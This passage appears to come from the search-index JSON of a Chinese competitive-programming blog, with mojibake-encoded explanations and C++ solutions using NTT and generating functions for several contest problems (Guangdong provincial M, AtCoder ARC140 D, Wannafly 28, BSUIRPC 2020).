x_1}{a_1 ^ 2} = 0 \\\\ \\frac{\\partial L}{\\partial x_2} = \\frac{\\prod\\limits_{i = 1} ^{k} x_i}{x_2} + \\frac{2\\lambda x_2}{a_2 ^ 2} = 0 \\\\ \\cdots \\\\ \\frac{\\partial L}{\\partial x_k} = \\frac{\\prod\\limits_{i = 1} ^{k} x_i}{x_k} + \\frac{2\\lambda x_k}{a_k ^ 2} = 0 \\\\ \\frac{\\partial L}{\\partial \\lambda} = \\sum_{i = 1} ^ {k}\\dfrac{x_i ^ 2}{a_i ^ 2} - 1 = 0 $$ é‚£ä¹ˆç¨å¾®åŒ–ç®€ä¸€ä¸‹ï¼Œå¯¹äº $1 \\le i \\le k$ éƒ½æœ‰ $$ \\prod_{i = 1} ^ {k}x_i = \\frac{-2\\lambda x_i ^ 2}{a_i ^ 2} $$ é€šè¿‡ä»»æ„ä¸¤å¼ $1 \\le i, j \\le k$ è”ç«‹æ¶ˆæ‰ $\\lambda$ $$ \\frac{a_i ^ 2\\prod\\limits_{i = 1} ^ {k}x_i}{-2x_i ^ 2} = \\frac{a_j ^ 2\\prod\\limits_{i = 1} ^ {k}x_i}{-2x_j ^ 2} $$ åŒ–ç®€å¾— $$ \\frac{x_i}{a_i} = \\frac{x_j}{a_j} $$ æ‰€ä»¥å½“ä¸”ä»…å½“ $\\dfrac{x_1}{a_1} = \\dfrac{x_2}{a_2}=\\cdots=\\dfrac{x_k}{a_k}$ æ—¶å–å¾—æœ€å¤§å€¼ï¼Œä¸” $\\sum\\limits_{i = 1} ^ {k}\\dfrac{x_i ^ 2}{a_i ^ 2} = 1$ï¼Œæ‰€ä»¥å¯¹ä»»æ„ $1 \\le i \\le k$ éƒ½æœ‰ $\\dfrac{x_i}{a_i} = \\pm \\sqrt{\\dfrac{1}{k}}$ï¼Œé‚£ä¹ˆ $\\prod\\limits_{i = 1} ^{k} x_i = k ^ {- \\frac{k}{2}}\\prod\\limits_{i = 1} ^ {k} a_i$ï¼Œå› ä¸º $k$ ä¸ºå¶æ•°ï¼Œæ‰€ä»¥ä¸€å®šä¸ºæ­£ï¼Œä¸” $\\dfrac{k}{2}$ ä¸€å®šæ˜¯æ•´æ•°ã€‚ æ±‚ä» $b$ æ•°ç»„ä¸­é€‰å‡º $k$ ä¸ªæ•°çš„æ‰€æœ‰ä¹˜ç§¯ä¹‹å’Œï¼Œè€ƒè™‘æ„é€ ç”Ÿæˆå‡½æ•° $$ F(x) = \\prod_{i = 1} ^ {k} (1 + b_ix) $$ é‚£ä¹ˆ $[x ^ k]F(x)$ å°±æ˜¯é€‰å‡º $k$ ä¸ªæ•°çš„æ‰€æœ‰ä¹˜ç§¯ä¹‹å’Œï¼Œæ€»å…±æœ‰ $\\dbinom{m}{k}$ ç§é€‰æ³•ï¼Œæ‰€ä»¥æœŸæœ›å°±ä¸º $$ k ^ {-\\frac{k}{2}} \\times \\frac{[x ^ k]F(x)}{\\dbinom{m}{k}} $$ $F(x)$ å¯ç”¨åˆ†æ²» $\\text{NTT}$ è®¡ç®—ï¼Œæ€»æ—¶é—´å¤æ‚åº¦ $O(n\\log ^ 2n)$ ","date":"2022-07-01","objectID":"/posts/cp2022-%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9Bm-%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E6%8F%92%E5%80%BC/:0:0","tags":["å¤šå…ƒå‡½æ•°æå€¼","åˆ†æ²» NTT"],"title":"[2022 å¹¿ä¸œçœèµ›M] æ‹‰æ ¼æœ—æ—¥æ’å€¼","uri":"/posts/cp2022-%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9Bm-%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E6%8F%92%E5%80%BC/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*(Poly a, Poly b) { if (a.size() == 0 || b.size() == 0) { return Poly(); } int sz = 1, tot = a.size() + b.size() - 1; while (sz \u003c tot) { sz *= 2; } a.a.resize(sz); b.a.resize(sz); dft(a.a); dft(b.a); for (int i = 0; i \u003c sz; i ++) { a.a[i] = a[i] * b[i]; } idft(a.a); a.resize(tot); return a; } friend Poly operator*(Z a, Poly b) { for (int i = 0; i \u003c int(b.size()); i ++) { b[i] *= a; } return b; } friend Poly operator*(Poly a, Z b) { for (int i = 0; i \u003c int(a.size()); i ++) { a[i] *= b; } return a; } Poly \u0026operator+=(Poly b) { return (*this) = (*this) + b; } Poly \u0026operator-=(Poly b) { return (*this) = (*this) - b; } Poly \u0026operator*=(Poly b) { return (*this) = (*this) * b; } Poly deriv() const { if (a.empty()) { return Poly(); } vector\u003cZ\u003e res(size() - 1); for (int i = 0; i \u003c size","date":"2022-07-01","objectID":"/posts/cp2022-%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9Bm-%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E6%8F%92%E5%80%BC/:1:0","tags":["å¤šå…ƒå‡½æ•°æå€¼","åˆ†æ²» NTT"],"title":"[2022 å¹¿ä¸œçœèµ›M] æ‹‰æ ¼æœ—æ—¥æ’å€¼","uri":"/posts/cp2022-%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9Bm-%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E6%8F%92%E5%80%BC/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ åˆå§‹æœ‰ $n$ ä¸ªç‚¹ï¼Œç»™å®šä¸€ä¸ªé•¿åº¦ä¸º $n$ çš„æ•°ç»„ $a_i$ï¼Œè‹¥ $a_i \\ne -1$ï¼Œåˆ™æœ‰æ— å‘è¾¹ $(i, a_i)$ï¼Œè‹¥ $a_i = -1$ï¼Œåˆ™ç‚¹ $i$ å¯ä»¥è¿å‘ $1 \\sim n$ ä»»æ„ç‚¹ï¼Œæ±‚æ‰€æœ‰å›¾çš„è”é€šå—ä¸ªæ•°ä¹‹å’Œ $1 \\le n \\le 2 \\times 10 ^ 3, a_i \\in [1, n] \\cup {-1}$ å¯¹ $998244353$ å–æ¨¡ã€‚ åˆ†æï¼š é¦–å…ˆè€ƒè™‘å¿½ç•¥ $a_i = -1$ çš„æ‰€æœ‰è¾¹ï¼Œé‚£ä¹ˆå›¾ä¸­ä¼šæœ‰è‹¥å¹²ä¸ªè¿é€šå—ï¼Œè¿™äº›è¿é€šå—åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š æ ‘ åŸºç¯æ ‘ ç¯ å¯¹äºç¯å’ŒåŸºç¯æ ‘æ¥è¯´ï¼Œå› ä¸ºæ˜¯ $n$ ä¸ªç‚¹å’Œ $n$ æ¡è¾¹ï¼Œæ‰€ä»¥ä»–ä»¬ä¸å¯èƒ½æœ‰ä¸€æ¡å‡ºè¾¹ï¼Œæ¢å¥è¯è¯´ï¼Œé‡Œè¾¹çš„ç‚¹ä¸å¯èƒ½åŒ…å« $a_i = -1$ï¼Œè€Œå¯¹äºæ ‘æ¥è¯´ï¼Œå› ä¸ºæ˜¯ $n$ ä¸ªç‚¹ $n - 1$ æ¡è¾¹ï¼Œæ‰€ä»¥æœ‰ä¸”ä»…æœ‰ä¸€æ¡å‡ºè¾¹ï¼Œä¹Ÿå°±æ˜¯æ ‘é‡Œé¢åªæœ‰ä¸€ä¸ª $a_i = -1$ è¿™å°±ä»£è¡¨æ ‘å¯ä»¥å’Œå…¶ä»–è¿é€šå—ç»„æˆä¸€ä¸ªæ–°çš„è¿é€šå—ï¼Œä½†æ˜¯æ— è®ºæ ‘å¦‚ä½•è¿è¾¹ï¼Œç¯å’ŒåŸºç¯æ ‘çš„è¿é€šæ€§éƒ½ä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œä¹Ÿå°±æ˜¯ä»–å§‹ç»ˆæœ‰ä¸€ä¸ªç¯ï¼Œæ‰€ä»¥å¯ä»¥å…ˆè®¡ç®—å‡ºè¿™éƒ¨åˆ†çš„è´¡çŒ®ï¼Œè®¾å›¾ä¸­ç¯å’ŒåŸºç¯æ ‘çš„æ•°é‡ä¸º $u$ï¼Œæ ‘çš„æ•°é‡ä¸º $v$ï¼Œåˆ™è¿™éƒ¨åˆ†è´¡çŒ®å°±ä¸º $u \\times n ^ {v}$ æ¥ä¸‹æ¥è€ƒè™‘æ ‘çš„æ‰€æœ‰è¿è¾¹æƒ…å†µï¼Œæˆ‘ä»¬æšä¸¾ $k$ æ¡è¾¹ç»„æˆä¸€ä¸ªç¯ï¼Œè®¾ç¬¬ $i$ æ£µæ ‘çš„å¤§å°ä¸º $f_i$ï¼Œæ¯æ£µæ ‘åˆ™æœ‰ç”Ÿæˆå‡½æ•° $1 + f_ix$ï¼Œè®° $F(x)$ ä¸ºé€‰è‹¥å¹²ä¸ªæ ‘æ„æˆä¸€ä¸ªç¯çš„æ–¹æ¡ˆæ•°ï¼Œå¯ä»¥ç”¨åˆ†æ²» $\\text{NTT}$ å¿«é€Ÿæ±‚å‡ºã€‚ $$ F(x) = \\prod_{i = 1} ^ {v} (1 + f_ix) $$ æ¯ä¸ªç‚¹æ„æˆä¸€ä¸ª $k$ å…ƒç¯æ˜¯æœ‰é¡ºåºçš„ï¼Œç¬¬ä¸€ä¸ªç‚¹å¯ä»¥æœ‰ $k - 1$ ç§é€‰æ‹©ï¼Œç¬¬äºŒä¸ªç‚¹æœ‰ $k - 2$ ç§é€‰æ‹©ï¼Œæ‰€ä»¥æ€»å…±æ„æˆä¸€ä¸ª $k$ å…ƒç¯çš„æ–¹æ¡ˆæ•°ä¸º $(k - 1)!$ï¼Œè¿˜è¦è€ƒè™‘å‰©ä¸‹æ²¡æœ‰è¢«é€‰å‡ºæ¥çš„ç‚¹ï¼Œé‚£ä¹ˆå¯ä»¥éšä¾¿è¿ï¼Œéƒ½ä¸å½±å“è¿™ä¸ªç¯ï¼Œæ–¹æ¡ˆæ•°å°±ä¸º $n ^ {v - k}$ï¼Œé‚£ä¹ˆç­”æ¡ˆå°±æ˜¯ $$ u \\times n ^ {v} + \\sum_{k = 1} ^ {v} (k - 1)! \\times [x ^ k]F(x) \\times n ^ {v - k} $$ æ—¶é—´å¤æ‚åº¦ $O(n\\log ^ 2n)$ ","date":"2022-05-18","objectID":"/posts/cpatcoder-arc140-d-one-to-one/:0:0","tags":["å›¾è®º","ç»„åˆè®¡æ•°","åˆ†æ²» NTT"],"title":"[AtCoder arc140 D] One to One","uri":"/posts/cpatcoder-arc140-d-one-to-one/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; struct DSU { vector\u003cint\u003e p, Size; DSU(int n) : p(n), Size(n, 1) { iota(p.begin(), p.end(), 0); } int find(int x) { return p[x] == x ? p[x] : p[x] = find(p[x]); } bool same(int u, int v) { return find(u) == find(v); } void merge(int u, int v) { u = find(u), v = find(v); if (u != v) { Size[v] += Size[u]; p[u] = v; } } }; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*(Poly a, Poly b) { if (a.size() == 0 || b.size() == 0) { return Poly(); } int sz = 1, tot = a.size() + b.size() - 1; while (sz \u003c tot) { sz *= 2; } a.a.resize(sz); b.a.resize(sz); dft(a.a); dft(b.a); for (int i = 0; i \u003c sz; i ++) { a.a[i] = a[i] * b[i]; } idft(a.a); a.resize(tot); return a; } friend Poly operator*(Z a, Poly b) { for (int i = 0; i \u003c int(b.size()); i ++) { b[i] *= a; } return b; } friend Poly operator*(Poly a, Z b) { for (int i = 0; i \u003c int(a.size","date":"2022-05-18","objectID":"/posts/cpatcoder-arc140-d-one-to-one/:1:0","tags":["å›¾è®º","ç»„åˆè®¡æ•°","åˆ†æ²» NTT"],"title":"[AtCoder arc140 D] One to One","uri":"/posts/cpatcoder-arc140-d-one-to-one/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ æœ‰ $n$ ç§ä½“ç§¯ä¸º $1$ çš„ç‰©å“å’Œ $m$ ç§ä½“ç§¯ä¸º $2$ çš„ç‰©å“ï¼Œæ±‚é€‰æ‹©ç‰©å“çš„ä½“ç§¯ä¸º $k$ çš„æ–¹æ¡ˆæ•° å¯¹ $998244353$ å–æ¨¡ $(1 \\le n, m \\le 10 ^ 6,1 \\le k \\le 9 \\times 10 ^ 8)$ åˆ†æï¼š æ‰€æœ‰ä½“ç§¯ä¸º $1$ çš„ç”Ÿæˆå‡½æ•°ä¸º $$ F(x) = \\left ( \\sum_{i = 0} ^ {\\infty} x ^ i \\right ) ^ n $$ æ‰€æœ‰ä½“ç§¯ä¸º $2$ çš„ç”Ÿæˆå‡½æ•°ä¸º $$ G(x) = \\left ( \\sum_{i = 0} ^ {\\infty} x ^ {2i} \\right ) ^ m $$ é‚£ä¹ˆç»„æˆçš„æ‰€æœ‰ä½“ç§¯æ–¹æ¡ˆæ•°ä¸º $F(x) \\times G(x)$ æŠŠ $F(x)$ å’Œ $G(x)$ å†™æˆå½¢å¼å¹‚çº§æ•°çš„é€†çš„å½¢å¼å°±ä¸º $$ \\frac{1}{(1-x) ^ n(1 - x ^ 2) ^ m} $$ ä¸ºäº†ä½¿åˆ†æ¯çš„å½¢å¼ä¸€è‡´ï¼Œå¯¹åˆ†æ•°ä¸Šä¸‹ä¹˜ $(1 + x) ^ n$ $$ \\frac{(1 + x) ^ n}{(1 - x ^ 2) ^ {n + m}} $$ å†æŠŠ $\\dfrac{1}{(1 - x ^ 2) ^ {n + m}}$ è½¬ä¸ºä¸€èˆ¬å½¢å¼ $\\sum\\limits_{j = 0} ^ {\\infty} \\binom{j + n + m - 1}{n + m - 1} x ^ {2j}$ é‚£ä¹ˆ $(1 + x) ^ n$ ä¹Ÿå¯¹åº”äºŒé¡¹å¼å±•å¼€ $\\sum\\limits_{i = 0} ^ {n} \\binom{n}{i} x ^ i$ å› ä¸ºæˆ‘ä»¬è¦æ±‚ç¬¬ $k$ é¡¹çš„ç³»æ•°ï¼Œæ‰€ä»¥è€ƒè™‘ $x ^ i$ ä¸ $x ^ {2j}$ å‡‘å‡º $x ^ k$ çš„æ‰€æœ‰é¡¹ï¼Œ ä¹Ÿå°±æ˜¯ $i + 2 j = k$ï¼Œæ•´ç†å‡º $j = \\dfrac{k - i}{2}$ ç”±äº $i \\in [0, n]$ æ‰€ä»¥å¯ä»¥ $O(n)$ æšä¸¾ $i$ çš„èŒƒå›´ï¼Œå³ $$ \\sum_{i = 0} ^ {n} [(k - i) \\bmod 2 = 0] \\binom{n}{i} \\binom{\\dfrac{k - i}{2} + n + m - 1}{n + m - 1} $$ æ¯æ¬¡ $\\dfrac{k - i}{2}$ åªä¼šå‡å°‘ $1$ï¼Œæ‰€ä»¥å¯¹ç¬¬äºŒä¸ªçš„ç»„åˆæ•°å¯ä»¥é€’æ¨æ±‚è§£ï¼Œåˆ†æ¯ä¸€å®šæ˜¯ $(n + m - 1)!$ï¼Œé‚£ä¹ˆåˆ†å­æ¯æ¬¡å¿…å®šä¼šå‡å°‘ $1$ï¼Œæ‰€ä»¥åªéœ€è¦ç»´æŠ¤ $a$ ä¸ºç¬¬ä¸€æ¬¡çš„ $\\dfrac{k - i}{2} + 1$ï¼Œä¹‹åæ¯æ¬¡ä¹˜ $a + n + m$ çš„é€†å…ƒå†ä¹˜ $a - 1$ å°±æ˜¯ç­”æ¡ˆ ($a$ æ¯æ¬¡è‡ªå‡ $1$) ","date":"2022-04-27","objectID":"/posts/cpwannafly-28-msc%E7%9A%84%E8%83%8C%E5%8C%85/:0:0","tags":["ç»„åˆæ•°","ç”Ÿæˆå‡½æ•°"],"title":"[Wannafly 28] mscçš„èƒŒåŒ…","uri":"/posts/cpwannafly-28-msc%E7%9A%84%E8%83%8C%E5%8C%85/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int mod = 998244353; int qmi(int a, int b) { int res = 1; while (b) { if (b \u0026 1) res = res * a % mod; a = a * a % mod; b \u003e\u003e= 1; } return res; } vector\u003cint\u003e fact, infact; void init(int n) { fact.resize(n + 1), infact.resize(n + 1); fact[0] = infact[0] = 1; for (int i = 1; i \u003c= n; i ++) { fact[i] = fact[i - 1] * i % mod; } infact[n] = qmi(fact[n], mod - 2); for (int i = n; i; i --) { infact[i - 1] = infact[i] * i % mod; } } int C(int n, int m) { if (n \u003c 0 || m \u003c 0 || n \u003c m) return 0; return fact[n] * infact[n - m] % mod * infact[m] % mod; } signed main() { cin.tie(0) -\u003e sync_with_stdio(0); init(1e6); int n, m, k; cin \u003e\u003e n \u003e\u003e m \u003e\u003e k; int res = 0; int inv = 1; for (int i = 1; i \u003c= n + m - 1; i ++) { inv = inv * i % mod; } inv = qmi(inv, mod - 2); int flag = 0, sum = 1, last = 0; for (int i = 0; i \u003c= n; i ++) { if ((k - i) % 2 == 0) { if (!flag) { flag = 1; for (int j = 1; j \u003c= n + m - 1; j ++) { sum = sum * ((k - i) / 2 + j) % mod; } last = (k - i) / 2 + 1; } else { last --; sum = sum * qmi((k - i) / 2 + n + m, mod - 2) % mod; sum = sum * last % mod; } res = (res + C(n, i) * sum % mod * inv % mod) % mod; } } cout \u003c\u003c res \u003c\u003c endl; } ","date":"2022-04-27","objectID":"/posts/cpwannafly-28-msc%E7%9A%84%E8%83%8C%E5%8C%85/:1:0","tags":["ç»„åˆæ•°","ç”Ÿæˆå‡½æ•°"],"title":"[Wannafly 28] mscçš„èƒŒåŒ…","uri":"/posts/cpwannafly-28-msc%E7%9A%84%E8%83%8C%E5%8C%85/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šä¸‰ä¸ªæ­£æ•´æ•° $n, d, k$ ï¼Œç°æœ‰æ’åˆ— $p = (1,2,3,\\cdots,n)$ ï¼Œæœ‰ $n - d + 1$ ä¸ªè¯¢é—®ï¼Œå¯¹äºæ¯ä¸ªè¯¢é—®æœ‰æ­£æ•´æ•° $m (d \\le m \\le n)$ ï¼Œç°ä» $p$ ä¸­éšæœºå¯é‡å¤åœ°é€‰å– $m$ ä¸ªæ•°æ„æˆåºåˆ— $q$ ï¼Œæ±‚ $q$ ä¸­ç¬¬ $d$ å°æ•°å¤§äº $k$ çš„æ¦‚ç‡ï¼Œ å¯¹ $998244353$ å–æ¨¡ã€‚ åˆ†æï¼š å¯¹äºæ»¡è¶³ç¬¬ $d$ å°æ•°å¤§äº $k$ çš„åºåˆ— $q = (a_1, a_2, \\cdots,a_i,\\cdots,a_m)$ ï¼Œå‡è®¾æœ€åä¸€ä¸ªå°äºç­‰äº $k$ çš„æ•°ä¸º $a_i$ï¼Œé‚£ä¹ˆä¸€å®šæœ‰ $i \\le d - 1$ï¼Œæ‰€ä»¥å‰ $i$ ä¸ªæ•°ä¸€å®šè¦åœ¨ $1 \\sim k$ ä¸­ä»»å–ï¼Œæ–¹æ¡ˆè®°ä¸º $F(x)$ï¼Œé‚£ä¹ˆå $m - i$ ä¸ªæ•°ä¸€å®šè¦åœ¨ $k +1 \\sim n$ ä¸­å–ï¼Œæ–¹æ¡ˆè®°ä¸º $G(x)$ï¼Œå¯ä»¥è€ƒè™‘å†™å‡º $F(x)$ ä¸ $G(x)$ çš„ç”Ÿæˆå‡½æ•°ï¼Œå› ä¸ºæ•°æ˜¯å¯æ’åˆ—çš„ï¼Œæ‰€ä»¥è¦ç”¨ $\\textbf{EGF}$ åœ¨ $1 \\sim k$ ä¸­å– $i$ ä¸ªæ•°çš„æ–¹æ¡ˆæ•°ä¸º $k ^ i$ï¼Œä½œä¸º $F(x)$ å– $i$ ä¸ªæ•°ç”Ÿæˆå‡½æ•°çš„ç³»æ•°ï¼Œ$1 \\sim k$ ä¸­è‡³å¤šå– $d - 1$ ä¸ªæ•°ï¼Œæ‰€ä»¥ $F(x)$ çš„é¡¹æ•°ä¸º $d$ $$ F(x) = 1+\\frac{k^1}{1!}x^1 + \\frac{k^2}{2!}x^2+\\cdots+\\frac{k^{d - 1}}{(d-1)!}x^{d - 1} $$ åœ¨ $k + 1 \\sim n$ ä¸­å– $i$ ä¸ªæ•°çš„æ–¹æ¡ˆæ•°ä¸º $(n - k) ^ {i}$ï¼Œä½œä¸º $G(x)$ å– $i$ ä¸ªæ•°ç”Ÿæˆå‡½æ•°çš„ç³»æ•°ï¼Œ$k + 1 \\sim n$ ä¸­å¯ä»¥å–è‡³å¤š $n$ ä¸ªæ•°ï¼Œæ‰€ä»¥ $G(x)$ é¡¹æ•°ä¸º $n + 1$ $$ G(x) = 1 + \\frac{(n - k) ^1}{1!}x^1 + \\frac{(n - k)^2}{2!}x^2 + \\cdots + \\frac{(n - k) ^ n}{n!}x^n $$ é‚£ä¹ˆé€‰ $m$ ä¸ªæ•°æ»¡è¶³ç¬¬ $d$ å°æ•°å¤§äº $k$ çš„æ€»æ–¹æ¡ˆæ•°å°±ä¸º $m!\\times[x^m] F(x)G(x)$ï¼Œæ‰€æœ‰å–æ•°çš„æƒ…å†µä¸º $n ^ m$ï¼Œæ‰€ä»¥æ¦‚ç‡å°±ä¸º $$ \\frac{m!\\times[x^m] F(x)G(x)}{n ^m} $$ å¯ä»¥ç”¨ $\\text{NTT}$ ç®—å‡º $F(x) * G(x)$ æ—¶é—´å¤æ‚åº¦ $O(n\\log n)$ ","date":"2022-04-13","objectID":"/posts/cp2020-bsuirpc-function-analysis/:0:0","tags":["EGF","NTT"],"title":"[2020 BSUIRPC] Function analysis","uri":"/posts/cp2020-bsuirpc-function-analysis/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return 